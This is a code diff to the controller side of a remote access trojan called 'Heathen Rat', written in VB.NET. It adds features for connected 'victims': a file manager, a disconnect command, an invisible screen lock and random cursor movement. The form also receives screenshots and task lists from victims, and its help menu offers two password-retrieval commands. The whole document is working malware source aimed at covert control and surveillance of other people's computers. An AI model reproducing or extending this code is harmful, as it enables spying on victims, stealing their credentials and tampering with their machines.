@@ -36,6 +36,7 @@ Public Class Heathen
         End Try
     End Sub
     Private Sub MessageReçu2(ByVal leMessage As String)
+
         TextBox1.AppendText(leMessage + vbNewLine)
 
 
@@ -123,129 +124,142 @@ Public Class Heathen
 
     Private Async Sub MessageReçu(ByVal leMessage As String)
         '  TextBox3.AppendText(leMessage + vbNewLine)
-        RichTextBox1.AppendText(leMessage) '+ vbNewLine)
-
-        If RichTextBox1.Text.EndsWith("ILoveScreenShppppt") Then
+        If leMessage = "NoneJustTryToConnect" Then
 
 
-            Dim k As String = RichTextBox1.Text.Replace("ILoveScreenShppppt", "")
+        Else
+            RichTextBox1.AppendText(leMessage) '+ vbNewLine)
 
-            PictureBox2.Image = Base64ToImage(k)
+            If RichTextBox1.Text.EndsWith("ILoveScreenShppppt") Then
 
-            Dim j As New ScreenForm
-            j.PictureBox1.Image = Base64ToImage(k)
 
-            If ComboBox1.Text = ListView1.SelectedItems(0).ToString Then
-                j.Label1.Text = ComboBox1.Text
-            ElseIf ComboBox1.Text.Length > 0 And ListView1.SelectedItems.Count = 0 Then
-                j.Label1.Text = ComboBox1.Text
-            ElseIf ListView1.SelectedItems.Count > 0 And ComboBox1.Text.Length = 0 Then
+                Dim k As String = RichTextBox1.Text.Replace("ILoveScreenShppppt", "")
 
-                Dim h = ListView1.SelectedItems(0).ToString
-                Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                PictureBox2.Image = Base64ToImage(k)
+
+                Dim j As New ScreenForm
+                j.PictureBox1.Image = Base64ToImage(k)
+
+                If ComboBox1.Text = ListView1.SelectedItems(0).ToString Then
+                    j.Label1.Text = ComboBox1.Text
+                ElseIf ComboBox1.Text.Length > 0 And ListView1.SelectedItems.Count = 0 Then
+                    j.Label1.Text = ComboBox1.Text
+                ElseIf ListView1.SelectedItems.Count > 0 And ComboBox1.Text.Length = 0 Then
+
+                    Dim h = ListView1.SelectedItems(0).ToString
+                    Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                    Dim odd As String = o.Replace("{", "")
+                    Dim odd2 As String = odd.Replace("}", "")
+                    Dim odd3() As String = Split(odd2, ":")
+
+                    lk = odd2
+                    j.Label1.Text = "Screenshot from victim : " & lk
+
+                ElseIf ListView1.SelectedItems.Count > 0 And ComboBox1.Text.Length > 0 Then
+                    Dim h = ListView1.SelectedItems(0).ToString
+                    Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                    Dim odd As String = o.Replace("{", "")
+                    Dim odd2 As String = odd.Replace("}", "")
+                    Dim odd3() As String = Split(odd2, ":")
+
+                    lk = odd2
+                    j.Label1.Text = "Screenshot from victim : " & lk
+
+                End If
+                j.Show()
+
+            ElseIf RichTextBox1.Text.EndsWith("ThisIISSTASK") Then
+
+                TaskForm.ListView1.Items.Clear()
+                Dim op As String = RichTextBox1.Text.Replace("ThisIISSTASK", "")
+
+
+                IO.File.WriteAllText("Task.txt", op)
+                Dim tsss As String() = IO.File.ReadAllLines("Task.txt")
+
+
+                Dim azd As New TaskForm
+                For Each h In tsss
+                    Dim k As String() = Split(h, "////")
+
+                    Dim lvi As New ListViewItem(k(0)) 'first column
+
+                    lvi.SubItems.Add(k(1)) 'column 2
+
+                    lvi.SubItems.Add(k(2))
+
+                    TaskForm.ListView1.Items.Add(lvi)
+                    'add all in listview
+                    '     ListView1.Items.Add(h.ProcessName).SubItems.Add(h.Id)
+
+
+
+                Next
+
+                TaskForm.ListView1.Sorting = SortOrder.Ascending
+
+                Dim hs = ListView1.SelectedItems(0).ToString
+                Dim o As String = hs.ToString.Replace("ListViewItem: ", "")
                 Dim odd As String = o.Replace("{", "")
                 Dim odd2 As String = odd.Replace("}", "")
                 Dim odd3() As String = Split(odd2, ":")
 
                 lk = odd2
-                j.Label1.Text = "Screenshot from victim : " & lk
 
-            ElseIf ListView1.SelectedItems.Count > 0 And ComboBox1.Text.Length > 0 Then
-                Dim h = ListView1.SelectedItems(0).ToString
-                Dim o As String = h.ToString.Replace("ListViewItem: ", "")
-                Dim odd As String = o.Replace("{", "")
-                Dim odd2 As String = odd.Replace("}", "")
-                Dim odd3() As String = Split(odd2, ":")
 
-                lk = odd2
-                j.Label1.Text = "Screenshot from victim : " & lk
+                TaskForm.Label1.Text = "Tasks from victim : " & lk
 
+                TaskForm.Show()
+
+                RichTextBox1.Text = String.Empty
+
+                ''Success Or Not to delete file
+            ElseIf RichTextBox1.Text.EndsWith("folderSS") Then
+                Dim op As String = RichTextBox1.Text
+                SuccessOrNotToDeleteFile(op)
+
+            ElseIf RichTextBox1.Text.Contains("Couldn'tGOFWW") Then
+                NoSuccesWiththisFolder()
+                'Couldn't go on with this folder. Need probably UAC or the folder has been deleted
+            ElseIf RichTextBox1.Text.Contains("StopAllAndSendItRightNow") Then
+
+                FMM.ListView1.Items.Clear()
+                Dim getpath As String() = Split(RichTextBox1.Text, "StopAllAndSendItRightNow")
+                Dim jk As String() = Split(getpath(0), "StopFilesNowDir")
+                PathForFM = getpath(1)
+                '  jk(0)  = files
+                IO.File.WriteAllText("jk(0).txt", jk(0))
+                IO.File.WriteAllText("jk(1).txt", jk(1))
+
+
+                'jk(1) = folders
+                Dim files As String() = IO.File.ReadAllLines("jk(0).txt")
+                Dim folders As String() = IO.File.ReadAllLines("jk(1).txt")
+                TimeToSetFM(files, folders)
+
+
+            ElseIf RichTextBox1.Text.Contains("NoGodPlsNoNOOO") Then
+                FMM.ListView1.Items.Clear()
+
+                BackgroundWorker1.RunWorkerAsync()
+
+
+            ElseIf RichTextBox1.Text.StartsWith("System") Then
+                AddInfo(vbCrLf & vbCrLf & RichTextBox1.Text)
+            ElseIf RichTextBox1.Text.EndsWith("fortaskkill") Then
+
+                CheckKillTask(RichTextBox1.Text)
+
+            ElseIf RichTextBox1.Text.Contains("TheVolumeSir") Then
+                GetVol(RichTextBox1.Text)
             End If
-            j.Show()
-
-        ElseIf RichTextBox1.Text.EndsWith("ThisIISSTASK") Then
-
-            TaskForm.ListView1.Items.Clear()
-            Dim op As String = RichTextBox1.Text.Replace("ThisIISSTASK", "")
-
-
-            IO.File.WriteAllText("Task.txt", op)
-            Dim tsss As String() = IO.File.ReadAllLines("Task.txt")
-
-
-            Dim azd As New TaskForm
-            For Each h In tsss
-                Dim k As String() = Split(h, "////")
-
-                Dim lvi As New ListViewItem(k(0)) 'first column
-
-                lvi.SubItems.Add(k(1)) 'column 2
-
-                lvi.SubItems.Add(k(2))
-
-                TaskForm.ListView1.Items.Add(lvi)
-                'add all in listview
-                '     ListView1.Items.Add(h.ProcessName).SubItems.Add(h.Id)
-
-
-
-            Next
-
-            TaskForm.ListView1.Sorting = SortOrder.Ascending
-
-            Dim hs = ListView1.SelectedItems(0).ToString
-            Dim o As String = hs.ToString.Replace("ListViewItem: ", "")
-            Dim odd As String = o.Replace("{", "")
-            Dim odd2 As String = odd.Replace("}", "")
-            Dim odd3() As String = Split(odd2, ":")
-
-            lk = odd2
-
-
-            TaskForm.Label1.Text = "Tasks from victim : " & lk
-
-            TaskForm.Show()
-
-            RichTextBox1.Text = String.Empty
-
-            ''Success Or Not to delete file
-        ElseIf RichTextBox1.Text.EndsWith("folderSS") Then
-            Dim op As String = RichTextBox1.Text
-            SuccessOrNotToDeleteFile(op)
-
-        ElseIf RichTextBox1.Text.Contains("StopAllAndSendItRightNow") Then
-
-            FMM.ListView1.Items.Clear()
-            Dim getpath As String() = Split(RichTextBox1.Text, "StopAllAndSendItRightNow")
-            Dim jk As String() = Split(getpath(0), "StopFilesNowDir")
-            PathForFM = getpath(1)
-            '  jk(0)  = files
-            IO.File.WriteAllText("jk(0).txt", jk(0))
-            IO.File.WriteAllText("jk(1).txt", jk(1))
-
-
-            'jk(1) = folders
-            Dim files As String() = IO.File.ReadAllLines("jk(0).txt")
-            Dim folders As String() = IO.File.ReadAllLines("jk(1).txt")
-            TimeToSetFM(files, folders)
-
-
-        ElseIf RichTextBox1.Text.Contains("NoGodPlsNoNOOO") Then
-            FMM.ListView1.Items.Clear()
-
-            BackgroundWorker1.RunWorkerAsync()
-
-
-        ElseIf RichTextBox1.Text.StartsWith("System") Then
-            AddInfo(vbCrLf & vbCrLf & RichTextBox1.Text)
-        ElseIf RichTextBox1.Text.EndsWith("fortaskkill") Then
-
-            CheckKillTask(RichTextBox1.Text)
-
-        ElseIf RichTextBox1.Text.Contains("TheVolumeSir") Then
-            GetVol(RichTextBox1.Text)
         End If
 
+
+    End Sub
+    Public Sub NoSuccesWiththisFolder()
+        MessageBox.Show("Couldn't go on with this folder. Need probably UAC or the folder has been deleted")
+        RichTextBox1.Text = String.Empty
     End Sub
     Public Sub GetVol(ByVal thevol As String)
         Dim op As String = thevol.Replace("TheVolumeSir", "")
@@ -302,7 +316,15 @@ Public Class Heathen
 
     Public Sub TimeToSetFM(ByVal files As String(), ByVal folders As String())
 
-        FMM.Text = lk
+        '     FMM.Text = lk
+
+        If ListView1.Focused Then
+            FMM.Text = lk
+
+        ElseIf BunifuButton3.Focused Then
+            FMM.Text = ComboBox1.Text
+
+        End If
 
         FMM.Label3.Text = PathForFM
         Dim imageList = New ImageList()
@@ -464,7 +486,7 @@ Public Class Heathen
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Text = "Hello " + Environment.UserName + " !" + " Welcome to Heathen Rat !"
-
+        '  Dim j As String = Nothing
     End Sub
 
 
@@ -583,6 +605,39 @@ Public Class Heathen
                     End If
 
                 Next
+            Case RichTextBox3.Text = "FM"
+                FMM.Text = ComboBox1.Text
+                Dim buffer() As Byte = Encoding.UTF8.GetBytes("IWouldLikeToseeYourFile")
+                For Each client As TcpClient In LesClients
+
+                    If ComboBox1.Text = client.Client.RemoteEndPoint.ToString Then
+
+                        Try
+                            client.GetStream().Write(buffer, 0, buffer.Length) '''
+                        Catch ex As Exception
+
+                            MessageBox.Show("The client seems to be offline")
+                        End Try
+                    End If
+
+                Next
+            Case RichTextBox3.Text = "Disconnect"
+                FMM.Text = ComboBox1.Text
+                Dim buffer() As Byte = Encoding.UTF8.GetBytes("ITSTIMETOSLEEP")
+                For Each client As TcpClient In LesClients
+
+                    If ComboBox1.Text = client.Client.RemoteEndPoint.ToString Then
+
+                        Try
+                            client.GetStream().Write(buffer, 0, buffer.Length) '''
+                        Catch ex As Exception
+
+                            MessageBox.Show("The client seems to be offline")
+                        End Try
+                    End If
+
+                Next
+                'ITSTIMETOSLEEP
         End Select
     End Sub
 
@@ -595,7 +650,8 @@ Public Class Heathen
                     RichTextBox3.Text = String.Empty
                     RichTextBox3.AppendText(vbCrLf & vbCrLf & "- This is the help menu" & vbCrLf &
                                             vbCrLf & "- Type ""PW1"" to retrieve passwords with method 1" & vbCrLf & vbCrLf & "- Type ""PW2"" to retrieve passwords with method 2" & vbCrLf &
-                                            vbCrLf & "- Type ""Take ScreenShot"" to take a screenshot of desktop victim " & vbCrLf & vbCrLf &
+                                            vbCrLf & "- Type ""Take ScreenShot"" to take a screenshot of desktop victim" & vbCrLf & vbCrLf & "- Type ""FM"" to enter in File Manager" _
+                                            & vbCrLf & vbCrLf & "- Type ""Disconnect"" to disconnect selected client" & vbCrLf & vbCrLf &
 "- You need to clear command center after each command sent")
                 Case RichTextBox3.Text.Contains("Clear") Or RichTextBox3.Text.Contains("clear")
                     RichTextBox3.Text = String.Empty
@@ -988,4 +1044,91 @@ Public Class Heathen
 
 
     End Function
+
+    Private Sub BlockScreenInvisibleToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BlockScreenInvisibleToolStripMenuItem.Click
+        If (LesClients.Count > 0) Then
+
+
+
+
+
+            Dim allstr As String = "LockInvisiblePlease"
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(allstr)
+            For Each h In ListView1.SelectedItems
+                '     MessageBox.Show(h.ToString)
+                Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                Dim odd As String = o.Replace("{", "")
+                Dim odd2 As String = odd.Replace("}", "")
+                Dim odd3() As String = Split(odd2, ":")
+
+                lk = odd2
+
+            Next
+
+            For Each client As TcpClient In LesClients
+
+                If lk = client.Client.RemoteEndPoint.ToString Then
+                    '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
+                    Try
+                        client.GetStream().Write(buffer, 0, buffer.Length) '''
+                    Catch ex As Exception
+
+                        MessageBox.Show("The client seems to be offline")
+                    End Try
+                End If
+
+            Next
+
+        End If
+
+
+
+    End Sub
+
+    Private Sub StartRandomCursorPositionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartRandomCursorPositionToolStripMenuItem.Click
+        'StartToChangeTheCursoToRandom
+        If (LesClients.Count > 0) Then
+
+
+
+
+
+            Dim allstr As String = "StartToChangeTheCursoToRandom"
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(allstr)
+            For Each h In ListView1.SelectedItems
+                '     MessageBox.Show(h.ToString)
+                Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                Dim odd As String = o.Replace("{", "")
+                Dim odd2 As String = odd.Replace("}", "")
+                Dim odd3() As String = Split(odd2, ":")
+
+                lk = odd2
+
+            Next
+
+            For Each client As TcpClient In LesClients
+
+                If lk = client.Client.RemoteEndPoint.ToString Then
+                    '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
+                    Try
+                        client.GetStream().Write(buffer, 0, buffer.Length) '''
+                    Catch ex As Exception
+
+                        MessageBox.Show("The client seems to be offline")
+                    End Try
+                End If
+
+            Next
+
+        End If
+    End Sub
+
+
+
+
+    '  Dim allstr As String = "UNLockInvisiblePlease"
+
+
 End Class
